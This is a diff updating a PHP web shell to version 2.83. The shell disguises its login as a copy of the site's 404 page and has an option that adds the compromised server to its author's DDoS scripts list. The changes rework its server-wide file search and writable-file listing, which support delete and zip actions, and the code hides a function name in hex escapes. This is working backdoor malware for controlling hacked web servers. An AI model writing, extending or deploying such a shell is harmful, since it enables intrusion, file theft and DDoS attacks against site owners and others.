@@ -1,6 +1,6 @@
 <?php
 $pass               = md5("pw");
-$version            = 2.82;
+$version            = 2.83;
 $adaptiveerrorpage  = true; //Get Default 404 page and replicate it, but add a login text field in the center at the bottom
 $checkforupdates    = true;
 $helpsupportbooter  = true; //True adds the shell to my ddos scripts list, I can't log in providing you change the password above
@@ -975,11 +975,23 @@ function shownav(e){
     } elseif ($view_writable == 'file') {
         $dirdata  = array();
         $filedata = GetWFileList($nowpath);
-    } elseif ($findstr) {
-        $filedata = GetSFileList($nowpath, $findstr, ($findin == "Find in File Content"),$re);
     } else {
         $dirs = @opendir($dir);
         while ($file = @readdir($dirs)) {
+            if ($findstr && in_array(getext($file), explode(',', $writabledb))){
+                $infile = ($findin == "Find in File Content");
+                if ($re){
+                    if (!$prgm('@' . $findstr . '@', $file) && !($infile && $prgm('@' . $findstr . '@', @file_get_contents($nowpath . $file)))) {
+                        continue;
+                    }
+                    
+                }else{
+                    if (!strstr($file, $findstr) && !($infile && strstr(@file_get_contents($nowpath . $file), $findstr))) {
+                        continue;
+                    }
+                }
+            }
+            if ($findstr && @is_dir($nowpath . $file)) continue;
             $filepath = $nowpath . $file;
             if (@is_dir($filepath)) {
                 $dirdb['filename']    = $file;
@@ -1061,6 +1073,7 @@ function shownav(e){
 				});
   	}
   }
+  if (!empty($dirdata)){
     foreach ($dirdata as $key => $dirdb) {
         if ($dirdb['filename'] != '..' && $dirdb['filename'] != '.') {
             if ($getdir && $getdir == $dirdb['server_link']) {
@@ -1089,8 +1102,10 @@ function shownav(e){
             }
         }
     }
+    }
     p('<tr bgcolor="#dddddd" stlye="border-top:1px solid #fff;border-bottom:1px solid #ddd;"><td colspan="6" height="5"></td></tr>');
     $file_i = '0';
+    if (!empty($filedata)) {
     foreach ($filedata as $key => $filedb) {
         if ($filedb['filename'] != '..' && $filedb['filename'] != '.') {
             $fileurl = str_replace($_SERVER["DOCUMENT_ROOT"], '', $filedb['server_link']);
@@ -1114,6 +1129,7 @@ function shownav(e){
             p('</td></tr>');
             $file_i++;
         }
+    }
     }
     p('<tr class="head"><td></td><td>File Name</td><td width="16%">Last Modified</td><td width="10%">Size</td><td width="20%">Chmod / Perms</td><td width="22%">Action</td></tr>');
     p('<tr class="' . bg() . '"><td align="center"><input id= "ckallbx" name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form)" /></td><td colspan="4"><a href="javascript:dofile(\'delfiles\');">Delete Selected</a> | <a href="javascript:dofile(\'zipfiles\');">Zip Selected</a></td><td align="right">' . $dir_i . ' directories / ' . $file_i . ' files</td></tr>');
@@ -3333,48 +3349,6 @@ function GetWFileList($dir)
                 GetWFileList($f);
             } elseif ($file != '.' && $file != '..' && is_file($f) && in_array($ext, explode(',', $writabledb))) {
                 if (is_writable($f)) {
-                    $filedata[$j]['filename']    = str_replace($nowpath, '', $f);
-                    $filedata[$j]['size']        = sizecount(@filesize($f));
-                    $filedata[$j]['mtime']       = @date('Y-m-d H:i:s', filemtime($f));
-                    $filedata[$j]['filechmod']   = getChmod($f);
-                    $filedata[$j]['fileperm']    = PermsColor($f);
-                    $filedata[$j]['fileowner']   = getUser($f);
-                    $filedata[$j]['dirlink']     = $dir;
-                    $filedata[$j]['server_link'] = $f;
-                    $j++;
-                }
-            }
-        }
-        closedir($dh);
-        clearstatcache();
-        return $filedata;
-    } else {
-        return array();
-    }
-}
-function GetSFileList($dir, $content, $infile = 1, $re = 0)
-{
-    global $filedata, $j, $nowpath, $writabledb;
-$prgm = "\x70\x72\x65\x67\x5f\x6d\x61\x74\x63\x68";
-    !$j && $j = 1;
-    if ($dh = opendir($dir)) {
-        while ($file = readdir($dh)) {
-            $ext = getext($file);
-            $f   = str_replace('//', '/', $dir . '/' . $file);
-            if ($file != '.' && $file != '..' && is_dir($f)) {
-                GetSFileList($f, $content, $re = 0);
-            } elseif ($file != '.' && $file != '..' && is_file($f) && in_array($ext, explode(',', $writabledb))) {
-                $find = 0;
-                if ($re) {
-                    if ($prgm('@' . $content . '@', $file) || ($infile && $prgm('@' . $content . '@', @file_get_contents($f)))) {
-                        $find = 1;
-                    }
-                } else {
-                    if (strstr($file, $content) || ($infile && strstr(@file_get_contents($f), $content))) {
-                        $find = 1;
-                    }
-                }
-                if ($find) {
                     $filedata[$j]['filename']    = str_replace($nowpath, '', $f);
                     $filedata[$j]['size']        = sizecount(@filesize($f));
                     $filedata[$j]['mtime']       = @date('Y-m-d H:i:s', filemtime($f));
